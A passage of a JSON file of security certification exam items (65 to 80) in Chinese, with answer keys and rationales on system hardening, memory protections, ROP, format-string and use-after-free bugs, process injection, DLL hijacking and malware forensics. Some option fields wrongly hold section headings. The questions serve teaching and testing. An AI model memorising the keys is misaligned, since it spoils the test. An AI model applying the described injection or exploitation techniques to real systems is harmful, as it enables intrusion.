        "D": "設定登入 Banner 提示「未授權存取將遭依法追究」，移除系統版本詳細資訊"
      },
      "answer": "C",
      "basis": "安全加固強調「可歸責性」（Accountability）與「最小權限原則」。多人共用同一個管理員帳號會導致事後稽核鑑識時無法追溯具體責任人；取消密碼過期更給予長期撞庫與密碼洩漏巨大攻擊窗口。因此 (C) 屬於嚴重的反安全實踐，符合題目「不符合最佳實踐」之要求。",
      "distractor": "- (A)、(B)、(D) 均為 CIS Benchmark 明確規範的安全加固硬化標準。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：安全加固強調「可歸責性」（Accountability）與「最小權限原則」。多人共用同一個管理員帳號會導致事後稽核鑑識時無法追溯具體責任人；取消密碼過期更給予長期撞庫與密碼洩漏巨大攻擊窗口。因此 (C) 屬於嚴重的反安全實踐，符合題目「不符合最佳實踐」之要求。\n\n- **干擾項辨析**：\n\n  - (A)、(B)、(D) 均為 CIS Benchmark 明確規範的安全加固硬化標準。"
    },
    {
      "id": 65,
      "exam": "exam_a",
      "domain": "領域四：系統安全加固、Linux/Windows 權限與配置",
      "category": "系統加固 / 日誌輪替與集中存儲",
      "type": "single_choice",
      "question": "在 Linux 系統中，日誌檔案若被惡意攻擊者在本機竄改或清空，將使鑑識工作極其困難。防範本機日誌被竄改最有效的加固手段為何？",
      "options": {
        "A": "使用 `chmod 000 /var/log/messages` 封鎖所有人讀寫",
        "B": "配置 Rsyslog / Syslog-ng 將關鍵安全日誌即時透過加密通道轉發（Forward）至遠端獨立的 SIEM 或集中式日誌伺服器",
        "C": "每天定時手動壓縮備份至 `/tmp` 目錄",
        "D": "停用 systemd-journald 服務以避免產生磁碟寫入  \n\n\n\n---\n\n\n\n## 領域五：逆向工程、惡意程式與二進位安全 (第 66 ~ 80 題)"
      },
      "answer": "B",
      "basis": "黑客在入侵伺服器取得 root 權限後，第一時間通常會清理 `/var/log` 下的存取記錄以掩蓋行蹤。防範日誌被毀損的最有效手段是「遠端集中式日誌轉發」（Log Forwarding）。透過 Rsyslog 配合 TLS 加密，將每筆安全事件即時發送到遠端專用日誌伺服器或 SIEM，攻擊者即便取得本機 root 權限，也無法修改已傳送至遠端的主機日誌。",
      "distractor": "- (A) `chmod 000` 會導致系統守護程式無法寫入日誌。\n\n  - (C) 備份在 `/tmp` 目錄下依然會被本機 root 刪除。\n\n  - (D) 停用 journald 等同於主動放棄系統日誌記錄。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：黑客在入侵伺服器取得 root 權限後，第一時間通常會清理 `/var/log` 下的存取記錄以掩蓋行蹤。防範日誌被毀損的最有效手段是「遠端集中式日誌轉發」（Log Forwarding）。透過 Rsyslog 配合 TLS 加密，將每筆安全事件即時發送到遠端專用日誌伺服器或 SIEM，攻擊者即便取得本機 root 權限，也無法修改已傳送至遠端的主機日誌。\n\n- **干擾項辨析**：\n\n  - (A) `chmod 000` 會導致系統守護程式無法寫入日誌。\n\n  - (C) 備份在 `/tmp` 目錄下依然會被本機 root 刪除。\n\n  - (D) 停用 journald 等同於主動放棄系統日誌記錄。"
    },
    {
      "id": 66,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "二進位防護 / ASLR 機制",
      "type": "single_choice",
      "question": "現代作業系統廣泛啟用的記憶體防護機制 ASLR（Address Space Layout Randomization）其主要防禦機制為何？",
      "options": {
        "A": "將可執行記憶體分頁標記為不可寫入",
        "B": "隨機化進程關鍵記憶體區域的基底位址（如 Stack, Heap, 共享函式庫），使攻擊者難以精確預測跳轉目標位址",
        "C": "在函式返回位址前插入 Canary 數值",
        "D": "靜態加密執行檔的機器代碼"
      },
      "answer": "B",
      "basis": "ASLR（位址空間配置隨機化）在每次程式啟動時，由作業系統核心動態隨機分配程式的棧（Stack）、堆（Heap）、共享庫（如 `libc.so`、`kernel32.dll`）以及可執行映像檔（需編譯為 PIE）的載入基底位址。由於位址每次執行都隨機變化，攻擊者無法在 Exploit 中寫死固定位址發動跳轉。",
      "distractor": "- (A) 將記憶體標記為不可寫入是 W^X 或唯讀保護。\n\n  - (C) 是 Stack Canary 的機制。\n\n  - (D) 是代碼混淆或加殼機制。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：ASLR（位址空間配置隨機化）在每次程式啟動時，由作業系統核心動態隨機分配程式的棧（Stack）、堆（Heap）、共享庫（如 `libc.so`、`kernel32.dll`）以及可執行映像檔（需編譯為 PIE）的載入基底位址。由於位址每次執行都隨機變化，攻擊者無法在 Exploit 中寫死固定位址發動跳轉。\n\n- **干擾項辨析**：\n\n  - (A) 將記憶體標記為不可寫入是 W^X 或唯讀保護。\n\n  - (C) 是 Stack Canary 的機制。\n\n  - (D) 是代碼混淆或加殼機制。"
    },
    {
      "id": 67,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "二進位防護 / DEP 與 NX",
      "type": "single_choice",
      "question": "資料執行防止（Data Execution Prevention, DEP / No-Execute, NX）技術其核心運作原理為何？",
      "options": {
        "A": "限制 CPU 只能執行核心空間的程式碼",
        "B": "利用硬體 CPU 頁表項中的 NX 位元，將堆疊（Stack）與堆積（Heap）等儲存資料的分頁標記為「不可執行」，防止攻擊者直接在堆疊上執行 Shellcode",
        "C": "阻止所有外部 DLL 檔案載入記憶體",
        "D": "自動攔截所有包含 `\\x90` (NOP) 的記憶體字元"
      },
      "answer": "B",
      "basis": "DEP/NX 的核心是「W^X」（Write XOR Execute，可寫與可執行互斥）。CPU 硬體記憶體管理單元（MMU）的頁表項中有一個 NX/XD (Execute-Disable) 位元。作業系統將堆疊與堆積分頁的 NX 位置為 1，當指令指標（EIP/RIP）嘗試跳轉至這些分頁執行代碼時，CPU 會立即觸發記憶體存取違規例外（Access Violation），直接終止程式，防止傳統 Shellcode 執行。",
      "distractor": "- (A) CPU 本身設計就支援使用者空間與核心空間的執行切換。\n\n  - (C)、(D) 與 DEP 硬體機制無關。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：DEP/NX 的核心是「W^X」（Write XOR Execute，可寫與可執行互斥）。CPU 硬體記憶體管理單元（MMU）的頁表項中有一個 NX/XD (Execute-Disable) 位元。作業系統將堆疊與堆積分頁的 NX 位置為 1，當指令指標（EIP/RIP）嘗試跳轉至這些分頁執行代碼時，CPU 會立即觸發記憶體存取違規例外（Access Violation），直接終止程式，防止傳統 Shellcode 執行。\n\n- **干擾項辨析**：\n\n  - (A) CPU 本身設計就支援使用者空間與核心空間的執行切換。\n\n  - (C)、(D) 與 DEP 硬體機制無關。"
    },
    {
      "id": 68,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "二進位防護 / Stack Canary",
      "type": "single_choice",
      "question": "編譯器引入的 Stack Smashing Protector（Canary 金絲雀機制）用於檢測堆疊溢位。Canary 數值在函式呼叫堆疊中的具體存放位置為何？",
      "options": {
        "A": "緊鄰在函數參數與局部變數之間",
        "B": "放置於局部緩衝區（Local Buffers）與保存的基底指標（Saved EBP/RBP）及返回位址（Return Address）之間",
        "C": "存放於代碼段（.text）開頭",
        "D": "存放於全域變數資料段（.data）"
      },
      "answer": "B",
      "basis": "Stack Canary（金絲雀保護）運作方式：函式進入時，編譯器生成的序言代碼（Prolog）會從執行緒控制區（FS/GS 暫存器）取得一個隨機數，壓入棧中，位置剛好介於「局部變數陣列」與「保存的 EBP/返回位址」之間。函式即將返回時（Epilog），會檢查該位置的數值是否被改變。若發生堆疊溢位覆寫返回位址，Canary 必定會先被覆寫，程式立即報錯並中止（`__stack_chk_fail`），防止控制流被劫持。",
      "distractor": "- (A)、(C)、(D) 存放位置均不符合 Stack Canary 的設計機制。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：Stack Canary（金絲雀保護）運作方式：函式進入時，編譯器生成的序言代碼（Prolog）會從執行緒控制區（FS/GS 暫存器）取得一個隨機數，壓入棧中，位置剛好介於「局部變數陣列」與「保存的 EBP/返回位址」之間。函式即將返回時（Epilog），會檢查該位置的數值是否被改變。若發生堆疊溢位覆寫返回位址，Canary 必定會先被覆寫，程式立即報錯並中止（`__stack_chk_fail`），防止控制流被劫持。\n\n- **干擾項辨析**：\n\n  - (A)、(C)、(D) 存放位置均不符合 Stack Canary 的設計機制。"
    },
    {
      "id": 69,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "二進位漏洞 / ROP 鏈攻擊技術",
      "type": "single_choice",
      "question": "在啟用 DEP/NX（堆疊不可執行）保護的現代環境下，攻擊者要控制程式執行流，最常採用何種攻擊技術？",
      "options": {
        "A": "ROP（Return-Oriented Programming，返回導向編程，拼湊程式或函式庫中既有的 Gadgets 片段）",
        "B": "NOP Sled 滑行攻擊",
        "C": "覆寫環境變數 PATH",
        "D": "暴力重送攻擊"
      },
      "answer": "A",
      "basis": "當 DEP/NX 使得攻擊者無法在堆疊上執行自定義 Shellcode 時，ROP（返回導向編程）成為主流繞過手段。攻擊者利用已載入程式或 `libc` 記憶體中原本就具備可執行屬性的現成指令片段（稱為 Gadgets，通常以 `ret` 指令結尾，如 `pop rdi; ret`）。透過在堆疊上精心構造連續的返回位址與參數，連續串接多個 Gadgets，最終呼叫 `system(\"/bin/sh\")` 或 `mprotect()` 將堆疊改為可執行。",
      "distractor": "- (B) NOP Sled 需要堆疊具備執行權限，在 DEP 下無法執行。\n\n  - (C)、(D) 不是二進位記憶體控制流劫持技術。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：當 DEP/NX 使得攻擊者無法在堆疊上執行自定義 Shellcode 時，ROP（返回導向編程）成為主流繞過手段。攻擊者利用已載入程式或 `libc` 記憶體中原本就具備可執行屬性的現成指令片段（稱為 Gadgets，通常以 `ret` 指令結尾，如 `pop rdi; ret`）。透過在堆疊上精心構造連續的返回位址與參數，連續串接多個 Gadgets，最終呼叫 `system(\"/bin/sh\")` 或 `mprotect()` 將堆疊改為可執行。\n\n- **干擾項辨析**：\n\n  - (B) NOP Sled 需要堆疊具備執行權限，在 DEP 下無法執行。\n\n  - (C)、(D) 不是二進位記憶體控制流劫持技術。"
    },
    {
      "id": 70,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "二進位漏洞 / 格式化字串漏洞",
      "type": "single_choice",
      "question": "在 C 語言程式中，若直接呼叫 `printf(userInput)` 而非 `printf(\"%s\", userInput)`，將導致格式化字串漏洞。攻擊者若傳入下列哪一個格式化說明符（Format Specifier），可以直接將記憶體中某一計數值**寫入**指定的記憶體位址？",
      "options": {
        "A": "`%x`",
        "B": "`%p`",
        "C": "`%n`",
        "D": "`%s`"
      },
      "answer": "C",
      "basis": "在 C 語言 `printf` 系列函數中，`%n` 是一個非常危險的格式化說明符。它的功能不是輸出資料，而是將「目前為止已經輸出的總字元數」以整數形式寫入到對應指標參數所指向的記憶體位址中。攻擊者結合棧位址定位參數，可利用 `%n`（或 `%hn`、`%hhn`）實現對任意記憶體位址的精確覆寫。",
      "distractor": "- (A) `%x` 以十六進位列印記憶體內容（讀操作）。\n\n  - (B) `%p` 以指標形式列印位址（讀操作）。\n\n  - (D) `%s` 將位址當作字串指標讀取字元輸出（讀操作）。",
      "full_solution": "- **正確答案**：**(C)**\n\n- **正解依據**：在 C 語言 `printf` 系列函數中，`%n` 是一個非常危險的格式化說明符。它的功能不是輸出資料，而是將「目前為止已經輸出的總字元數」以整數形式寫入到對應指標參數所指向的記憶體位址中。攻擊者結合棧位址定位參數，可利用 `%n`（或 `%hn`、`%hhn`）實現對任意記憶體位址的精確覆寫。\n\n- **干擾項辨析**：\n\n  - (A) `%x` 以十六進位列印記憶體內容（讀操作）。\n\n  - (B) `%p` 以指標形式列印位址（讀操作）。\n\n  - (D) `%s` 將位址當作字串指標讀取字元輸出（讀操作）。"
    },
    {
      "id": 71,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "二進位漏洞 / Use-After-Free",
      "type": "single_choice",
      "question": "釋放後使用（Use-After-Free, UAF）記憶體破壞漏洞的成因與危害為何？",
      "options": {
        "A": "記憶體指標在被 `free()` 釋放後未被置為 NULL，後續程式仍引用該懸空指標（Dangling Pointer），若該記憶體塊被攻擊者新分配的惡意物件佔據，引用時將觸發任意代碼執行",
        "B": "陣列索引超出上界導致記憶體溢出",
        "C": "整數加法運算結果超出最大值翻轉為負數",
        "D": "程式嘗試存取 NULL 指標導致崩潰"
      },
      "answer": "A",
      "basis": "UAF（釋放後使用）：當程式使用 `free(ptr)` 釋放某塊堆記憶體後，若未將 `ptr` 設定為 `NULL`，該指針即成為懸空指標（Dangling Pointer）。由於堆記憶體管理器（如 ptmalloc）具備記憶體重複使用機制，攻擊者後續分配一個包含偽造函數指針的惡意物件，剛好佔用該塊被釋放的記憶體。當原程式再次呼叫 `ptr->virtual_func()` 時，便會跳轉執行攻擊者控制的任意代碼。",
      "distractor": "- (B) 是陣列越界（Out-of-Bounds）。\n\n  - (C) 是整數溢位（Integer Overflow）。\n\n  - (D) 是空指針解引用（NULL Pointer Dereference）。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：UAF（釋放後使用）：當程式使用 `free(ptr)` 釋放某塊堆記憶體後，若未將 `ptr` 設定為 `NULL`，該指針即成為懸空指標（Dangling Pointer）。由於堆記憶體管理器（如 ptmalloc）具備記憶體重複使用機制，攻擊者後續分配一個包含偽造函數指針的惡意物件，剛好佔用該塊被釋放的記憶體。當原程式再次呼叫 `ptr->virtual_func()` 時，便會跳轉執行攻擊者控制的任意代碼。\n\n- **干擾項辨析**：\n\n  - (B) 是陣列越界（Out-of-Bounds）。\n\n  - (C) 是整數溢位（Integer Overflow）。\n\n  - (D) 是空指針解引用（NULL Pointer Dereference）。"
    },
    {
      "id": 72,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "二進位防護 / PIE 與 RELRO",
      "type": "single_choice",
      "question": "在 Linux GCC 編譯安全選項中，若檢查二進位檔案得到 `Full RELRO`，這代表哪一項安全加固措施？",
      "options": {
        "A": "程式被靜態編譯且不依賴任何外部庫",
        "B": "全域偏移表（Global Offset Table, GOT）在程式啟動動態連結完成後立即被標記為完全唯讀，徹底封鎖 GOT 覆寫攻擊（GOT Overwrite）",
        "C": "禁用所有系統呼叫（System Calls）",
        "D": "程式碼被混淆加密以防止 IDA Pro 反編譯"
      },
      "answer": "B",
      "basis": "RELRO（Relocation Read-Only，重定位唯讀）：\n\n  - `Partial RELRO`：僅將 ELF 內部段重定位為唯讀，GOT 表依然可寫（延遲綁定 Lazy Binding 啟用）。\n\n  - `Full RELRO`：編譯時要求連結器在程式啟動時立即解析並填寫所有動態函式位址（Now 綁定），隨後將整個 GOT 表（`.got` 與 `.got.plt`）標記為純唯讀（Read-Only）。這徹底封鎖了攻擊者透過任意記憶體寫入漏洞覆寫 GOT 表項目（如將 `puts` 改為 `system`）的利用路徑。",
      "distractor": "- (A) 靜態編譯參數是 `-static`。\n\n  - (C) 限制系統呼叫是 Seccomp 機制。\n\n  - (D) 混淆保護依賴專用混淆編譯器（如 OLLVM）。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：RELRO（Relocation Read-Only，重定位唯讀）：\n\n  - `Partial RELRO`：僅將 ELF 內部段重定位為唯讀，GOT 表依然可寫（延遲綁定 Lazy Binding 啟用）。\n\n  - `Full RELRO`：編譯時要求連結器在程式啟動時立即解析並填寫所有動態函式位址（Now 綁定），隨後將整個 GOT 表（`.got` 與 `.got.plt`）標記為純唯讀（Read-Only）。這徹底封鎖了攻擊者透過任意記憶體寫入漏洞覆寫 GOT 表項目（如將 `puts` 改為 `system`）的利用路徑。\n\n- **干擾項辨析**：\n\n  - (A) 靜態編譯參數是 `-static`。\n\n  - (C) 限制系統呼叫是 Seccomp 機制。\n\n  - (D) 混淆保護依賴專用混淆編譯器（如 OLLVM）。"
    },
    {
      "id": 73,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "靜態分析 / 反組譯控制流圖",
      "type": "single_choice",
      "question": "在使用 IDA Pro 或 Ghidra 對二進位執行檔進行靜態分析時，控制流圖（CFG）中條件跳轉指令（如 x86 的 `JZ / JE`）通常會分支出兩條路徑。在 IDA 的圖形視圖中，條件成立（Taken）通常顯示為何種顏色的箭頭？",
      "options": {
        "A": "綠色箭頭（Green）",
        "B": "紅色箭頭（Red）",
        "C": "藍色箭頭（Blue）",
        "D": "黑色箭頭（Black）"
      },
      "answer": "A",
      "basis": "在 IDA Pro 圖形控制流檢視（Graph View）中：\n\n  - **綠色箭頭**：代表條件跳轉**成立**（Condition Met / Branch Taken，例如 `JZ` 且 ZF=1）；\n\n  - **紅色箭頭**：代表條件跳轉**不成立**（Condition Not Met / Branch Not Taken，即順序執行下一條指令）；\n\n  - **藍色箭頭**：代表無條件跳轉（如 `JMP`）。",
      "distractor": "- (B) 紅色是條件不成立路徑。\n\n  - (C) 藍色是無條件跳轉。\n\n  - (D) 黑色不是標準 IDA 分支顏色。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：在 IDA Pro 圖形控制流檢視（Graph View）中：\n\n  - **綠色箭頭**：代表條件跳轉**成立**（Condition Met / Branch Taken，例如 `JZ` 且 ZF=1）；\n\n  - **紅色箭頭**：代表條件跳轉**不成立**（Condition Not Met / Branch Not Taken，即順序執行下一條指令）；\n\n  - **藍色箭頭**：代表無條件跳轉（如 `JMP`）。\n\n- **干擾項辨析**：\n\n  - (B) 紅色是條件不成立路徑。\n\n  - (C) 藍色是無條件跳轉。\n\n  - (D) 黑色不是標準 IDA 分支顏色。"
    },
    {
      "id": 74,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "動態除錯 / 斷點原理",
      "type": "single_choice",
      "question": "除錯器（如 GDB、x64dbg）在設定軟體中斷點（Software Breakpoint）時，其底層向目標記憶體位址寫入的 x86/x64 單字節中斷機器碼為何？",
      "options": {
        "A": "`\\x90` (NOP)",
        "B": "`\\xCC` (INT 3)",
        "C": "`\\xCD\\x80` (INT 0x80)",
        "D": "`\\x0F\\x05` (SYSCALL)"
      },
      "answer": "B",
      "basis": "在 x86/x64 架構中，軟體中斷點是透過向目標指令位址寫入單字節機器碼 `0xCC`（對應指令 `INT 3`）來實現的。當 CPU 執行到 `0xCC` 時，會觸發 3 號斷點異常中斷處理常式，作業系統捕獲該異常後通知除錯器暫停目標行程，並等待使用者輸入命令。",
      "distractor": "- (A) `\\x90` 是 NOP（無操作）。\n\n  - (C) `\\xCD\\x80` 是 Linux 32 位元系統呼叫中斷。\n\n  - (D) `\\x0F\\x05` 是 x86_64 現代 64 位元系統呼叫指令 `SYSCALL`。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在 x86/x64 架構中，軟體中斷點是透過向目標指令位址寫入單字節機器碼 `0xCC`（對應指令 `INT 3`）來實現的。當 CPU 執行到 `0xCC` 時，會觸發 3 號斷點異常中斷處理常式，作業系統捕獲該異常後通知除錯器暫停目標行程，並等待使用者輸入命令。\n\n- **干擾項辨析**：\n\n  - (A) `\\x90` 是 NOP（無操作）。\n\n  - (C) `\\xCD\\x80` 是 Linux 32 位元系統呼叫中斷。\n\n  - (D) `\\x0F\\x05` 是 x86_64 現代 64 位元系統呼叫指令 `SYSCALL`。"
    },
    {
      "id": 75,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "惡意分析 / 反除錯技術",
      "type": "single_choice",
      "question": "Windows 惡意程式常用於檢測自身是否正在被除錯器分析的 Win32 API 函數為何？",
      "options": {
        "A": "`IsDebuggerPresent()`",
        "B": "`GetCurrentProcessId()`",
        "C": "`VirtualAlloc()`",
        "D": "`CreateFileW()`"
      },
      "answer": "A",
      "basis": "`IsDebuggerPresent()` 是 Win32 API 提供的最經典反除錯函數。其底層實作非常簡單，直接讀取當前行程環境塊（Process Environment Block, PEB）中的 `BeingDebugged` 旗標（位於 PEB 偏移 `0x02` 處）。若該位元為 1，表示當前行程正在被除錯器掛鉤運行，惡意軟體藉此偵測並提前退出或執行干擾代碼。",
      "distractor": "- (B) 取得目前行程 PID，非反除錯。\n\n  - (C) 分配虛擬記憶體。\n\n  - (D) 建立或開啟檔案。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：`IsDebuggerPresent()` 是 Win32 API 提供的最經典反除錯函數。其底層實作非常簡單，直接讀取當前行程環境塊（Process Environment Block, PEB）中的 `BeingDebugged` 旗標（位於 PEB 偏移 `0x02` 處）。若該位元為 1，表示當前行程正在被除錯器掛鉤運行，惡意軟體藉此偵測並提前退出或執行干擾代碼。\n\n- **干擾項辨析**：\n\n  - (B) 取得目前行程 PID，非反除錯。\n\n  - (C) 分配虛擬記憶體。\n\n  - (D) 建立或開啟檔案。"
    },
    {
      "id": 76,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "惡意分析 / 程式碼注入技術",
      "type": "single_choice",
      "question": "惡意程式在進行「進程注入」（Process Injection）以將惡意 Shellcode 注入合法系統進程（如 `explorer.exe`）時，最經典的 Windows API 調用序列依序為何？",
      "options": {
        "A": "`OpenProcess` -> `VirtualAllocEx` -> `WriteProcessMemory` -> `CreateRemoteThread`",
        "B": "`CreateFile` -> `ReadFile` -> `WriteFile` -> `CloseHandle`",
        "C": "`RegOpenKey` -> `RegSetValue` -> `RegCloseKey`",
        "D": "`socket` -> `bind` -> `listen` -> `accept`"
      },
      "answer": "A",
      "basis": "傳統 Windows 遠端進程代碼注入的標準四步 API 調用序列：\n\n  1. `OpenProcess`：開啟目標合法進程（如 `explorer.exe`），取得具有注入權限的進程控制代碼（Handle）；\n\n  2. `VirtualAllocEx`：在目標進程的虛擬記憶體空間中分配一塊可讀可寫可執行的記憶體分頁（`PAGE_EXECUTE_READWRITE`）；\n\n  3. `WriteProcessMemory`：將攻擊者的惡意代碼或 DLL 路徑寫入剛分配的目標記憶體空間；\n\n  4. `CreateRemoteThread`：在目標進程中建立一個遠端執行緒，使其進入點指向剛寫入的惡意代碼起始位址並執行。",
      "distractor": "- (B) 一般檔案讀寫序列。\n\n  - (C) 登錄檔鍵值操作序列。\n\n  - (D) 標準 BSD Socket 網路伺服器建立序列。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：傳統 Windows 遠端進程代碼注入的標準四步 API 調用序列：\n\n  1. `OpenProcess`：開啟目標合法進程（如 `explorer.exe`），取得具有注入權限的進程控制代碼（Handle）；\n\n  2. `VirtualAllocEx`：在目標進程的虛擬記憶體空間中分配一塊可讀可寫可執行的記憶體分頁（`PAGE_EXECUTE_READWRITE`）；\n\n  3. `WriteProcessMemory`：將攻擊者的惡意代碼或 DLL 路徑寫入剛分配的目標記憶體空間；\n\n  4. `CreateRemoteThread`：在目標進程中建立一個遠端執行緒，使其進入點指向剛寫入的惡意代碼起始位址並執行。\n\n- **干擾項辨析**：\n\n  - (B) 一般檔案讀寫序列。\n\n  - (C) 登錄檔鍵值操作序列。\n\n  - (D) 標準 BSD Socket 網路伺服器建立序列。"
    },
    {
      "id": 77,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "惡意分析 / DLL 搜尋順序劫持",
      "type": "single_choice",
      "question": "當 Windows 應用程式嘗試載入未指定完整路徑的動態連結庫（DLL）時，若系統未啟用安全 DLL 搜尋模式，預設最優先搜尋的目錄為哪一個？",
      "options": {
        "A": "系統目錄 `C:\\Windows\\System32`",
        "B": "應用程式目前所在的目錄（Application Directory）",
        "C": "Windows 目錄 `C:\\Windows`",
        "D": "環境變數 PATH 中列出的目錄"
      },
      "answer": "B",
      "basis": "在 Windows DLL 載入搜尋順序中（若未啟用安全 DLL 搜尋模式），系統搜尋順序最優先的目錄永遠是**應用程式執行檔載入時所在的目錄**（The directory from which the application loaded）。攻擊者常在合法軟體同目錄下放置惡意同名 DLL，誘騙軟體優先載入惡意 DLL，此手法稱為 DLL 搜尋順序劫持（DLL Search Order Hijacking）。",
      "distractor": "- (A) `System32` 在預設順序中次於應用程式當前目錄（或僅在安全搜尋模式下次於當前目錄）。\n\n  - (C)、(D) 搜尋順序均排在更後方。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：在 Windows DLL 載入搜尋順序中（若未啟用安全 DLL 搜尋模式），系統搜尋順序最優先的目錄永遠是**應用程式執行檔載入時所在的目錄**（The directory from which the application loaded）。攻擊者常在合法軟體同目錄下放置惡意同名 DLL，誘騙軟體優先載入惡意 DLL，此手法稱為 DLL 搜尋順序劫持（DLL Search Order Hijacking）。\n\n- **干擾項辨析**：\n\n  - (A) `System32` 在預設順序中次於應用程式當前目錄（或僅在安全搜尋模式下次於當前目錄）。\n\n  - (C)、(D) 搜尋順序均排在更後方。"
    },
    {
      "id": 78,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "惡意分析 / 脫殼技術",
      "type": "single_choice",
      "question": "加殼軟體（Packer，如 UPX）常透過壓縮或加密來阻礙靜態分析。加殼程式在記憶體中解壓縮完原始代碼後，必須跳轉回原始程式的進入點以繼續執行。該原始程式進入點在逆向分析中統稱之為何？",
      "options": {
        "A": "OEP (Original Entry Point)",
        "B": "IAT (Import Address Table)",
        "C": "RVA (Relative Virtual Address)",
        "D": "PE Header"
      },
      "answer": "A",
      "basis": "加殼軟體在加殼時，會將 PE 標頭中的進入點改為加殼程式自身的解壓縮引導代碼。當外殼代碼在記憶體中解壓縮/解密完原始程式的代碼段與數據段，修復導入表（IAT）與重定位表後，外殼代碼會執行一條長跳轉指令（如 `jmp OEP`），將執行流交還給原始程式的真實起始位址，該位址被稱為 **OEP**（Original Entry Point，原始程式進入點）。",
      "distractor": "- (B) IAT 是導入位址表。\n\n  - (C) RVA 是相對虛擬位址。\n\n  - (D) PE Header 是 PE 檔案標頭結構。",
      "full_solution": "- **正確答案**：**(A)**\n\n- **正解依據**：加殼軟體在加殼時，會將 PE 標頭中的進入點改為加殼程式自身的解壓縮引導代碼。當外殼代碼在記憶體中解壓縮/解密完原始程式的代碼段與數據段，修復導入表（IAT）與重定位表後，外殼代碼會執行一條長跳轉指令（如 `jmp OEP`），將執行流交還給原始程式的真實起始位址，該位址被稱為 **OEP**（Original Entry Point，原始程式進入點）。\n\n- **干擾項辨析**：\n\n  - (B) IAT 是導入位址表。\n\n  - (C) RVA 是相對虛擬位址。\n\n  - (D) PE Header 是 PE 檔案標頭結構。"
    },
    {
      "id": 79,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "惡意分析 / 檔案偽裝與特徵碼",
      "type": "single_choice",
      "question": "在 Windows 系統中，PE 執行檔的開頭兩個字節必定為著名的魔術數字（Magic Number），對應 ASCII 字串為何？",
      "options": {
        "A": "`PK`",
        "B": "`MZ` (十六進位 `4D 5A`)",
        "C": "`\\x7FELF`",
        "D": "`GIF89a`"
      },
      "answer": "B",
      "basis": "Windows PE（Portable Executable）檔案格式繼承了傳統 MS-DOS 的設計。所有 PE 執行檔（`.exe`、`.dll`、`.sys`）的開頭前兩個字節必定為 `4D 5A`，對應 ASCII 字元 `MZ`（向 MS-DOS 設計者 Mark Zbikowski 致敬）。",
      "distractor": "- (A) `PK` 是 ZIP 壓縮檔案格式魔術數字（`50 4B 03 04`）。\n\n  - (C) `\\x7FELF` 是 Linux ELF 執行檔魔術數字。\n\n  - (D) `GIF89a` 是 GIF 圖片魔術數字。",
      "full_solution": "- **正確答案**：**(B)**\n\n- **正解依據**：Windows PE（Portable Executable）檔案格式繼承了傳統 MS-DOS 的設計。所有 PE 執行檔（`.exe`、`.dll`、`.sys`）的開頭前兩個字節必定為 `4D 5A`，對應 ASCII 字元 `MZ`（向 MS-DOS 設計者 Mark Zbikowski 致敬）。\n\n- **干擾項辨析**：\n\n  - (A) `PK` 是 ZIP 壓縮檔案格式魔術數字（`50 4B 03 04`）。\n\n  - (C) `\\x7FELF` 是 Linux ELF 執行檔魔術數字。\n\n  - (D) `GIF89a` 是 GIF 圖片魔術數字。"
    },
    {
      "id": 80,
      "exam": "exam_a",
      "domain": "領域五：逆向工程、惡意程式與二進位安全",
      "category": "惡意分析 / 記憶體取證特徵 malfind",
      "type": "single_choice",
      "question": "在 Volatility 記憶體取證分析中，`malfind` 插件主要藉由搜尋記憶體中符合哪種特徵的分頁來識別隱匿的代碼注入或木馬 Payload？",
      "options": {
        "A": "記憶體保護屬性為 `PAGE_EXECUTE_READWRITE` (RWX) 且通常帶有未對應磁碟檔案的 MZ 標頭或 Shellcode 特徵",
        "B": "分頁大小小於 4KB",
        "C": "記憶體中包含繁體中文字串",
        "D": "具有核心空間 `ring 0` 屬性  \n\n\n\n---\n\n\n\n## 領域六：資安法規、標準與治理體系 (第 81 ~ 90 題)"
      },
      "answer": "A",
      "basis": "Volatility 的 `malfind` 插件專為尋找隱藏的注入代碼而設計。它掃描記憶體中所有具備 `PAGE_EXECUTE_READWRITE`（可讀、可寫、可執行，即 RWX 屬性）特權的記憶體分頁，且特別比對該記憶體分頁是否沒有對應到磁碟上的合法檔案。若該記憶體開頭含有 `MZ` 標頭或常見 Shellcode 彙編特徵（如 `0x55 0x8B 0xEC`），`malfind` 會立即將其轉儲報告為高度可疑的注入代碼。",
      "distractor": "- (B)、(C)、(D) 均非 `malfind` 判別的核心指標。",
